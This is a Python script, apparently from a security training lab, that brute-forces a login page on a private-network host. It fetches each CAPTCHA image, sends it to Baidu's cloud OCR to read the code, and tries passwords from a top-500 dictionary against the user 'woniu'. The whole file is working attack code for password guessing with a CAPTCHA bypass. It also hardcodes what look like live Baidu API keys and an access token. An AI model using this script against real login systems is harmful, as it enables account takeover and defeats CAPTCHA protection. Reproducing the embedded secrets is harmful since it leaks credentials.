#取得百度接口的access_token
#利用百度智能云的文字识别接口进行密码爆破
import time
import requests,base64
import json

#得到access_token
def get_access_token():
    api_key = 'TdstlZJh8RiNIJmPtl9hQKJg'
    secret_key = 'nHRy5sUXAkkGyYwzXUpCg6bwlDBG0Hhh'
    url = f"https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&client_id={api_key}&client_secret={secret_key}"

    payload = ""
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
    }

    response = requests.request("POST", url, headers=headers, data=payload)

    print(response.text)

# encoding:utf-8

'''
通用文字识别（高精度版）
'''
#测试ocr结果
def do_baidu_ocr():
    request_url = "https://aip.baidubce.com/rest/2.0/ocr/v1/accurate_basic"
    # 二进制方式打开图片文件
    f = open('./vcode.png', 'rb')
    img = base64.b64encode(f.read())

    params = {"image":img}
    access_token = '24.53a3c1f611097935b54d34376238e3c3.2592000.1742390791.282335-117540685'
    request_url = request_url + "?access_token=" + access_token
    headers = {'content-type': 'application/x-www-form-urlencoded'}
    response = requests.post(request_url, data=params, headers=headers)
    if response:
        # print (response.json())
        print(response.text)

#利用ocr实现爆破
def burst_login(password):
    #百度的接口无法直接读取到内网中的验证码url地址
    # data = {'url' : 'http://192.168.222.140/security/vcode.php'}

    session = requests.session()
    #先从本地获取验证码图片的二进制数据
    resp_vcode = session.get('http://192.168.222.140/security/vcode.php')
    img = base64.b64encode(resp_vcode.content)
    #交给百度ocr识别
    params = {"image": img}
    access_token = '24.53a3c1f611097935b54d34376238e3c3.2592000.1742390791.282335-117540685'
    baidu_url = "https://aip.baidubce.com/rest/2.0/ocr/v1/accurate_basic"
    baidu_url = baidu_url + "?access_token=" + access_token
    headers = {'content-type': 'application/x-www-form-urlencoded'}
    response_baidu = requests.post(baidu_url, data=params, headers=headers)
    #从返回的json中取得验证码
    vcode = "0000"
    if response_baidu:
        vcode = response_baidu.json()["words_result"][0]["words"]
    # print(vcode)

    #进行登录的爆破
    data = {'username': "woniu", "password": password, "vcode": vcode}
    resp = session.post(url="http://192.168.222.140/security/login-2.php", data=data)
    if 'vcode-error' in resp.text:
        print(f"验证码出错,payload为:{data}")
    #验证码有可能识别错误，本轮爆破完之后再对验证码出错的密码进行爆破
    else:
        if ('login-fail' not in resp.text) and ("vcode-error" not in resp.text) :
            print(f'登陆成功,payload为:{data}')
if __name__ == '__main__':
    # get_access_token()
    do_baidu_ocr()
    # with open('../dict/password_top500.txt') as file:
    #     pass_list = file.readlines()
    # for password in pass_list:
    #     burst_login(password.strip())
    #     #百度接口有线程限制
    #     time.sleep(2)